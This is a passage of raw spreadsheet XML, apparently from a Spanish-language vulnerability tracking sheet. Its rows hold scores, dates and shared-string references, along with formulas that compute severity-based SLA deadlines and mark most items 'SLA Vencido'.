      <c r="AG455" s="27" t="s">
        <v>747</v>
      </c>
      <c r="AH455" t="str">
        <f>IFERROR(VLOOKUP(H455,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="456" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A456" s="5">
        <v>455</v>
      </c>
      <c r="B456" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C456" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D456" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G456" s="54" t="s">
        <v>1323</v>
      </c>
      <c r="H456" t="s">
        <v>1751</v>
      </c>
      <c r="J456" t="s">
        <v>971</v>
      </c>
      <c r="L456" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M456" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N456">
        <v>5.3</v>
      </c>
      <c r="Q456" t="s">
        <v>1752</v>
      </c>
      <c r="T456" s="1">
        <v>45850</v>
      </c>
      <c r="U456" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>359</v>
      </c>
      <c r="V456" s="1">
        <f t="shared" si="21"/>
        <v>45940</v>
      </c>
      <c r="W456" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB456" t="s">
        <v>1753</v>
      </c>
      <c r="AC456" t="s">
        <v>1754</v>
      </c>
      <c r="AE456" s="68" t="s">
        <v>147</v>
      </c>
      <c r="AG456" s="51" t="s">
        <v>969</v>
      </c>
      <c r="AH456" t="str">
        <f>IFERROR(VLOOKUP(H456,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="457" spans="1:34" ht="87" hidden="1" x14ac:dyDescent="0.35">
      <c r="A457" s="5">
        <v>456</v>
      </c>
      <c r="B457" t="s">
        <v>32</v>
      </c>
      <c r="C457" t="s">
        <v>33</v>
      </c>
      <c r="D457" t="s">
        <v>34</v>
      </c>
      <c r="G457" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H457" t="s">
        <v>1755</v>
      </c>
      <c r="J457" t="s">
        <v>80</v>
      </c>
      <c r="L457" t="s">
        <v>655</v>
      </c>
      <c r="M457" t="s">
        <v>61</v>
      </c>
      <c r="N457">
        <v>4.4000000000000004</v>
      </c>
      <c r="Q457" t="s">
        <v>1756</v>
      </c>
      <c r="T457" s="1">
        <v>45852</v>
      </c>
      <c r="U457" s="11">
        <f t="shared" ca="1" si="23"/>
        <v>357</v>
      </c>
      <c r="V457" s="8">
        <f t="shared" si="21"/>
        <v>45942</v>
      </c>
      <c r="W457" s="12" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB457" s="65" t="s">
        <v>1757</v>
      </c>
      <c r="AC457" s="65" t="s">
        <v>1758</v>
      </c>
      <c r="AD457" s="65" t="s">
        <v>1759</v>
      </c>
      <c r="AE457" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG457" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH457" t="str">
        <f>IFERROR(VLOOKUP(H457,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="458" spans="1:34" ht="87" hidden="1" x14ac:dyDescent="0.35">
      <c r="A458" s="5">
        <v>457</v>
      </c>
      <c r="B458" t="s">
        <v>32</v>
      </c>
      <c r="C458" t="s">
        <v>33</v>
      </c>
      <c r="D458" t="s">
        <v>34</v>
      </c>
      <c r="G458" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="J458" t="s">
        <v>1760</v>
      </c>
      <c r="L458" t="s">
        <v>655</v>
      </c>
      <c r="M458" t="s">
        <v>1470</v>
      </c>
      <c r="N458">
        <v>3</v>
      </c>
      <c r="Q458" t="s">
        <v>1756</v>
      </c>
      <c r="T458" s="1">
        <v>45852</v>
      </c>
      <c r="U458" s="11">
        <f t="shared" ca="1" si="23"/>
        <v>357</v>
      </c>
      <c r="V458" s="8">
        <f t="shared" si="21"/>
        <v>45972</v>
      </c>
      <c r="W458" s="12" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB458" s="65" t="s">
        <v>1761</v>
      </c>
      <c r="AC458" s="65" t="s">
        <v>1762</v>
      </c>
      <c r="AD458" s="65" t="s">
        <v>1763</v>
      </c>
      <c r="AE458" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG458" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH458" t="str">
        <f>IFERROR(VLOOKUP(H458,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="459" spans="1:34" ht="232" hidden="1" x14ac:dyDescent="0.35">
      <c r="A459" s="5">
        <v>458</v>
      </c>
      <c r="B459" t="s">
        <v>32</v>
      </c>
      <c r="C459" t="s">
        <v>33</v>
      </c>
      <c r="D459" t="s">
        <v>34</v>
      </c>
      <c r="G459" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="J459" t="s">
        <v>1764</v>
      </c>
      <c r="L459" t="s">
        <v>655</v>
      </c>
      <c r="M459" t="s">
        <v>1470</v>
      </c>
      <c r="N459">
        <v>2.8</v>
      </c>
      <c r="Q459" t="s">
        <v>1756</v>
      </c>
      <c r="T459" s="1">
        <v>45852</v>
      </c>
      <c r="U459" s="11">
        <f t="shared" ca="1" si="23"/>
        <v>357</v>
      </c>
      <c r="V459" s="8">
        <f t="shared" si="21"/>
        <v>45972</v>
      </c>
      <c r="W459" s="12" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB459" s="65" t="s">
        <v>1765</v>
      </c>
      <c r="AC459" s="65" t="s">
        <v>1766</v>
      </c>
      <c r="AD459" s="65" t="s">
        <v>1767</v>
      </c>
      <c r="AE459" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG459" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH459" t="str">
        <f>IFERROR(VLOOKUP(H459,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="460" spans="1:34" ht="130.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A460" s="5">
        <v>459</v>
      </c>
      <c r="B460" t="s">
        <v>32</v>
      </c>
      <c r="C460" t="s">
        <v>33</v>
      </c>
      <c r="D460" t="s">
        <v>34</v>
      </c>
      <c r="G460" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="J460" t="s">
        <v>1233</v>
      </c>
      <c r="L460" t="s">
        <v>655</v>
      </c>
      <c r="M460" t="s">
        <v>1470</v>
      </c>
      <c r="N460">
        <v>2.8</v>
      </c>
      <c r="Q460" t="s">
        <v>1756</v>
      </c>
      <c r="T460" s="1">
        <v>45852</v>
      </c>
      <c r="U460" s="11">
        <f t="shared" ca="1" si="23"/>
        <v>357</v>
      </c>
      <c r="V460" s="8">
        <f t="shared" si="21"/>
        <v>45972</v>
      </c>
      <c r="W460" s="12" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB460" s="65" t="s">
        <v>1768</v>
      </c>
      <c r="AC460" s="65" t="s">
        <v>1769</v>
      </c>
      <c r="AD460" s="65" t="s">
        <v>1770</v>
      </c>
      <c r="AE460" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG460" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH460" t="str">
        <f>IFERROR(VLOOKUP(H460,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="461" spans="1:34" ht="16.5" hidden="1" x14ac:dyDescent="0.45">
      <c r="A461" s="5">
        <v>460</v>
      </c>
      <c r="B461" t="s">
        <v>32</v>
      </c>
      <c r="C461" t="s">
        <v>225</v>
      </c>
      <c r="D461" t="s">
        <v>34</v>
      </c>
      <c r="G461" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H461" t="s">
        <v>1771</v>
      </c>
      <c r="J461" t="s">
        <v>556</v>
      </c>
      <c r="L461" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M461" t="s">
        <v>61</v>
      </c>
      <c r="N461">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q461" t="s">
        <v>1772</v>
      </c>
      <c r="T461" s="1">
        <v>45857</v>
      </c>
      <c r="U461" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>352</v>
      </c>
      <c r="V461" s="1">
        <f t="shared" si="21"/>
        <v>45947</v>
      </c>
      <c r="W461" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB461" s="69" t="s">
        <v>1542</v>
      </c>
      <c r="AC461" s="65" t="s">
        <v>1773</v>
      </c>
      <c r="AE461" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG461" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH461" t="str">
        <f>IFERROR(VLOOKUP(H461,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="462" spans="1:34" ht="16.5" hidden="1" x14ac:dyDescent="0.45">
      <c r="A462" s="5">
        <v>461</v>
      </c>
      <c r="B462" t="s">
        <v>32</v>
      </c>
      <c r="C462" t="s">
        <v>225</v>
      </c>
      <c r="D462" t="s">
        <v>34</v>
      </c>
      <c r="G462" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H462" t="s">
        <v>1774</v>
      </c>
      <c r="J462" t="s">
        <v>556</v>
      </c>
      <c r="L462" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M462" t="s">
        <v>61</v>
      </c>
      <c r="N462">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q462" t="s">
        <v>1772</v>
      </c>
      <c r="T462" s="1">
        <v>45857</v>
      </c>
      <c r="U462" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>352</v>
      </c>
      <c r="V462" s="1">
        <f t="shared" si="21"/>
        <v>45947</v>
      </c>
      <c r="W462" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB462" s="69" t="s">
        <v>1542</v>
      </c>
      <c r="AC462" s="65" t="s">
        <v>1773</v>
      </c>
      <c r="AE462" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG462" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH462" t="str">
        <f>IFERROR(VLOOKUP(H462,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="463" spans="1:34" ht="16.5" hidden="1" x14ac:dyDescent="0.45">
      <c r="A463" s="5">
        <v>462</v>
      </c>
      <c r="B463" t="s">
        <v>32</v>
      </c>
      <c r="C463" t="s">
        <v>225</v>
      </c>
      <c r="D463" t="s">
        <v>34</v>
      </c>
      <c r="G463" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H463" t="s">
        <v>1775</v>
      </c>
      <c r="J463" t="s">
        <v>556</v>
      </c>
      <c r="L463" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M463" t="s">
        <v>61</v>
      </c>
      <c r="N463">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q463" t="s">
        <v>1772</v>
      </c>
      <c r="T463" s="1">
        <v>45857</v>
      </c>
      <c r="U463" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>352</v>
      </c>
      <c r="V463" s="1">
        <f t="shared" si="21"/>
        <v>45947</v>
      </c>
      <c r="W463" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB463" s="69" t="s">
        <v>1542</v>
      </c>
      <c r="AC463" s="65" t="s">
        <v>1773</v>
      </c>
      <c r="AE463" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG463" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH463" t="str">
        <f>IFERROR(VLOOKUP(H463,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="464" spans="1:34" ht="16.5" hidden="1" x14ac:dyDescent="0.45">
      <c r="A464" s="5">
        <v>463</v>
      </c>
      <c r="B464" t="s">
        <v>32</v>
      </c>
      <c r="C464" t="s">
        <v>225</v>
      </c>
      <c r="D464" t="s">
        <v>34</v>
      </c>
      <c r="G464" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H464" t="s">
        <v>1776</v>
      </c>
      <c r="J464" t="s">
        <v>556</v>
      </c>
      <c r="L464" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M464" t="s">
        <v>61</v>
      </c>
      <c r="N464">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q464" t="s">
        <v>1772</v>
      </c>
      <c r="T464" s="1">
        <v>45857</v>
      </c>
      <c r="U464" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>352</v>
      </c>
      <c r="V464" s="1">
        <f t="shared" si="21"/>
        <v>45947</v>
      </c>
      <c r="W464" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB464" s="69" t="s">
        <v>1542</v>
      </c>
      <c r="AC464" s="65" t="s">
        <v>1773</v>
      </c>
      <c r="AE464" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG464" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH464" t="str">
        <f>IFERROR(VLOOKUP(H464,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="465" spans="1:34" ht="16.5" hidden="1" x14ac:dyDescent="0.45">
      <c r="A465" s="5">
        <v>464</v>
      </c>
      <c r="B465" t="s">
        <v>32</v>
      </c>
      <c r="C465" t="s">
        <v>225</v>
      </c>
      <c r="D465" t="s">
        <v>34</v>
      </c>
      <c r="G465" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H465" t="s">
        <v>1777</v>
      </c>
      <c r="J465" t="s">
        <v>556</v>
      </c>
      <c r="L465" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M465" t="s">
        <v>61</v>
      </c>
      <c r="N465">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q465" t="s">
        <v>1772</v>
      </c>
      <c r="T465" s="1">
        <v>45857</v>
      </c>
      <c r="U465" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>352</v>
      </c>
      <c r="V465" s="1">
        <f t="shared" si="21"/>
        <v>45947</v>
      </c>
      <c r="W465" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB465" s="69" t="s">
        <v>1542</v>
      </c>
      <c r="AC465" s="65" t="s">
        <v>1773</v>
      </c>
      <c r="AE465" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG465" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH465" t="str">
        <f>IFERROR(VLOOKUP(H465,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="466" spans="1:34" ht="16.5" hidden="1" x14ac:dyDescent="0.45">
      <c r="A466" s="5">
        <v>465</v>
      </c>
      <c r="B466" t="s">
        <v>32</v>
      </c>
      <c r="C466" t="s">
        <v>225</v>
      </c>
      <c r="D466" t="s">
        <v>34</v>
      </c>
      <c r="G466" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H466" t="s">
        <v>1778</v>
      </c>
      <c r="J466" t="s">
        <v>556</v>
      </c>
      <c r="L466" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M466" t="s">
        <v>61</v>
      </c>
      <c r="N466">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q466" t="s">
        <v>1772</v>
      </c>
      <c r="T466" s="1">
        <v>45857</v>
      </c>
      <c r="U466" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>352</v>
      </c>
      <c r="V466" s="1">
        <f t="shared" si="21"/>
        <v>45947</v>
      </c>
      <c r="W466" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB466" s="69" t="s">
        <v>1542</v>
      </c>
      <c r="AC466" s="65" t="s">
        <v>1773</v>
      </c>
      <c r="AE466" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG466" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH466" t="str">
        <f>IFERROR(VLOOKUP(H466,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="467" spans="1:34" ht="16.5" hidden="1" x14ac:dyDescent="0.45">
      <c r="A467" s="5">
        <v>466</v>
      </c>
      <c r="B467" t="s">
        <v>32</v>
      </c>
      <c r="C467" t="s">
        <v>225</v>
      </c>
      <c r="D467" t="s">
        <v>34</v>
      </c>
      <c r="G467" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H467" t="s">
        <v>1779</v>
      </c>
      <c r="J467" t="s">
        <v>556</v>
      </c>
      <c r="L467" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M467" t="s">
        <v>61</v>
      </c>
      <c r="N467">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q467" t="s">
        <v>1772</v>
      </c>
      <c r="T467" s="1">
        <v>45857</v>
      </c>
      <c r="U467" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>352</v>
      </c>
      <c r="V467" s="1">
        <f t="shared" si="21"/>
        <v>45947</v>
      </c>
      <c r="W467" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB467" s="69" t="s">
        <v>1542</v>
      </c>
      <c r="AC467" s="65" t="s">
        <v>1773</v>
      </c>
      <c r="AE467" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG467" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH467" t="str">
        <f>IFERROR(VLOOKUP(H467,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="468" spans="1:34" ht="30" hidden="1" x14ac:dyDescent="0.45">
      <c r="A468" s="5">
        <v>467</v>
      </c>
      <c r="B468" t="s">
        <v>32</v>
      </c>
      <c r="C468" t="s">
        <v>225</v>
      </c>
      <c r="D468" t="s">
        <v>34</v>
      </c>
      <c r="G468" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H468" t="s">
        <v>1780</v>
      </c>
      <c r="J468" t="s">
        <v>560</v>
      </c>
      <c r="L468" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M468" t="s">
        <v>61</v>
      </c>
      <c r="N468">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q468" t="s">
        <v>1772</v>
      </c>
      <c r="T468" s="1">
        <v>45857</v>
      </c>
      <c r="U468" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>352</v>
      </c>
      <c r="V468" s="1">
        <f t="shared" si="21"/>
        <v>45947</v>
      </c>
      <c r="W468" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB468" s="69" t="s">
        <v>1522</v>
      </c>
      <c r="AC468" s="65" t="s">
        <v>1781</v>
      </c>
      <c r="AE468" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG468" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH468" t="str">
        <f>IFERROR(VLOOKUP(H468,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="469" spans="1:34" ht="30" hidden="1" x14ac:dyDescent="0.45">
      <c r="A469" s="5">
        <v>468</v>
      </c>
      <c r="B469" t="s">
        <v>32</v>
      </c>
      <c r="C469" t="s">
        <v>225</v>
      </c>
      <c r="D469" t="s">
        <v>34</v>
      </c>
      <c r="G469" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H469" t="s">
        <v>1782</v>
      </c>
      <c r="J469" t="s">
        <v>560</v>
      </c>
      <c r="L469" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M469" t="s">
        <v>61</v>
      </c>
      <c r="N469">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q469" t="s">
        <v>1772</v>
      </c>
      <c r="T469" s="1">
        <v>45857</v>
      </c>
      <c r="U469" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>352</v>
      </c>
      <c r="V469" s="1">
        <f t="shared" si="21"/>
        <v>45947</v>
      </c>
      <c r="W469" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB469" s="69" t="s">
        <v>1522</v>
      </c>
      <c r="AC469" s="65" t="s">
        <v>1781</v>
      </c>
      <c r="AE469" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG469" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH469" t="str">
        <f>IFERROR(VLOOKUP(H469,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="470" spans="1:34" ht="30" hidden="1" x14ac:dyDescent="0.45">
      <c r="A470" s="5">
        <v>469</v>
      </c>
      <c r="B470" t="s">
        <v>32</v>
      </c>
      <c r="C470" t="s">
        <v>225</v>
      </c>
      <c r="D470" t="s">
        <v>34</v>
      </c>
      <c r="G470" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H470" t="s">
        <v>1783</v>
      </c>
      <c r="J470" t="s">
        <v>560</v>
      </c>
      <c r="L470" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M470" t="s">
        <v>61</v>
      </c>
      <c r="N470">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q470" t="s">
        <v>1772</v>
      </c>
      <c r="T470" s="1">
        <v>45857</v>
      </c>
      <c r="U470" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>352</v>
      </c>
      <c r="V470" s="1">
        <f t="shared" si="21"/>
        <v>45947</v>
      </c>
      <c r="W470" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB470" s="69" t="s">
        <v>1522</v>
      </c>
      <c r="AC470" s="65" t="s">
        <v>1781</v>
      </c>
      <c r="AE470" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG470" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH470" t="str">
        <f>IFERROR(VLOOKUP(H470,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="471" spans="1:34" ht="30" hidden="1" x14ac:dyDescent="0.45">
      <c r="A471" s="5">
        <v>470</v>
      </c>
      <c r="B471" t="s">
        <v>32</v>
      </c>
      <c r="C471" t="s">
        <v>225</v>
      </c>
      <c r="D471" t="s">
        <v>34</v>
      </c>
      <c r="G471" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H471" t="s">
        <v>1784</v>
      </c>
      <c r="J471" t="s">
        <v>560</v>
      </c>
      <c r="L471" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M471" t="s">
        <v>61</v>
      </c>
      <c r="N471">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q471" t="s">
        <v>1772</v>
      </c>
      <c r="T471" s="1">
        <v>45857</v>
      </c>
      <c r="U471" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>352</v>
      </c>
      <c r="V471" s="1">
        <f t="shared" si="21"/>
        <v>45947</v>
      </c>
      <c r="W471" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB471" s="69" t="s">
        <v>1522</v>
      </c>
      <c r="AC471" s="65" t="s">
        <v>1781</v>
      </c>
      <c r="AE471" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG471" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH471" t="str">
        <f>IFERROR(VLOOKUP(H471,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="472" spans="1:34" ht="30" hidden="1" x14ac:dyDescent="0.45">
      <c r="A472" s="5">
        <v>471</v>
      </c>
      <c r="B472" t="s">
        <v>32</v>
      </c>
      <c r="C472" t="s">
        <v>225</v>
      </c>
      <c r="D472" t="s">
        <v>34</v>
      </c>
      <c r="G472" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H472" t="s">
        <v>1785</v>
      </c>
      <c r="J472" t="s">
        <v>560</v>
      </c>
      <c r="L472" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M472" t="s">
        <v>61</v>
      </c>
      <c r="N472">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q472" t="s">
        <v>1772</v>
      </c>
      <c r="T472" s="1">
        <v>45857</v>
      </c>
      <c r="U472" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>352</v>
      </c>
      <c r="V472" s="1">
        <f t="shared" si="21"/>
        <v>45947</v>
      </c>
      <c r="W472" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB472" s="69" t="s">
        <v>1522</v>
      </c>
      <c r="AC472" s="65" t="s">
        <v>1781</v>
      </c>
      <c r="AE472" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG472" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH472" t="str">
        <f>IFERROR(VLOOKUP(H472,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="473" spans="1:34" ht="30" hidden="1" x14ac:dyDescent="0.45">
      <c r="A473" s="5">
        <v>472</v>
      </c>
      <c r="B473" t="s">
        <v>32</v>
      </c>
      <c r="C473" t="s">
        <v>225</v>
      </c>
      <c r="D473" t="s">
        <v>34</v>
      </c>
      <c r="G473" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H473" t="s">
        <v>1786</v>
      </c>
      <c r="J473" t="s">
        <v>560</v>
      </c>
      <c r="L473" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M473" t="s">
        <v>61</v>
      </c>
      <c r="N473">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q473" t="s">
        <v>1772</v>
      </c>
      <c r="T473" s="1">
        <v>45857</v>
      </c>
      <c r="U473" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>352</v>
      </c>
      <c r="V473" s="1">
        <f t="shared" si="21"/>
        <v>45947</v>
      </c>
      <c r="W473" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB473" s="69" t="s">
        <v>1522</v>
      </c>
      <c r="AC473" s="65" t="s">
        <v>1781</v>
      </c>
      <c r="AE473" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG473" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH473" t="str">
        <f>IFERROR(VLOOKUP(H473,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="474" spans="1:34" ht="30" hidden="1" x14ac:dyDescent="0.45">
      <c r="A474" s="5">
        <v>473</v>
      </c>
      <c r="B474" t="s">
        <v>32</v>
      </c>
      <c r="C474" t="s">
        <v>225</v>
      </c>
      <c r="D474" t="s">
        <v>34</v>
      </c>
      <c r="G474" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H474" t="s">
        <v>1787</v>
      </c>
      <c r="J474" t="s">
        <v>560</v>
      </c>
      <c r="L474" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M474" t="s">
        <v>61</v>
      </c>
      <c r="N474">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q474" t="s">
        <v>1772</v>
      </c>
      <c r="T474" s="1">
        <v>45857</v>
      </c>
      <c r="U474" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>352</v>
      </c>
      <c r="V474" s="1">
        <f t="shared" ref="V474:V537" si="24">IF(M474="Critical",T474+10,IF(M474="High",T474+30,IF(M474="Bad",T474+30,IF(M474="Medium",T474+90,IF(M474="Warm",T474+90,IF(M474="Low",T474+120,IF(M474="Fair",T474+120,IF(M474="Neutral",T474+120,""))))))))</f>
        <v>45947</v>
      </c>
      <c r="W474" s="56" t="str">
        <f t="shared" ref="W474:W537" ca="1" si="25">IF(M474="Critical",IF(U474&gt;10,"SLA Vencido","En SLA"),IF(M474="High",IF(U474&gt;30,"SLA Vencido","En SLA"),IF(M474="Bad",IF(U474&gt;30,"SLA Vencido","En SLA"),IF(M474="Medium",IF(U474&gt;90,"SLA Vencido","En SLA"),IF(M474="Warm",IF(U474&gt;90,"SLA Vencido","En SLA"),IF(M474="Low",IF(U474&gt;120,"SLA Vencido","En SLA"),IF(M474="Fair",IF(U474&gt;120,"SLA Vencido","En SLA"),IF(M474="Neutral",IF(U474&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="AB474" s="69" t="s">
        <v>1522</v>
      </c>
      <c r="AC474" s="65" t="s">
        <v>1781</v>
      </c>
      <c r="AE474" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG474" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH474" t="str">
        <f>IFERROR(VLOOKUP(H474,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="475" spans="1:34" ht="59" hidden="1" x14ac:dyDescent="0.45">
      <c r="A475" s="5">
        <v>474</v>
      </c>
      <c r="B475" t="s">
        <v>32</v>
      </c>
      <c r="C475" t="s">
        <v>225</v>
      </c>
      <c r="D475" t="s">
        <v>34</v>
      </c>
      <c r="G475" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H475" t="s">
        <v>1788</v>
      </c>
      <c r="J475" t="s">
        <v>574</v>
      </c>
      <c r="L475" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M475" t="s">
        <v>61</v>
      </c>
      <c r="N475">
        <v>5.2</v>
      </c>
      <c r="Q475" t="s">
        <v>1772</v>
      </c>
      <c r="T475" s="1">
        <v>45857</v>
      </c>
      <c r="U475" s="55">
        <f t="shared" ca="1" si="23"/>
        <v>352</v>
      </c>
      <c r="V475" s="1">
        <f t="shared" si="24"/>
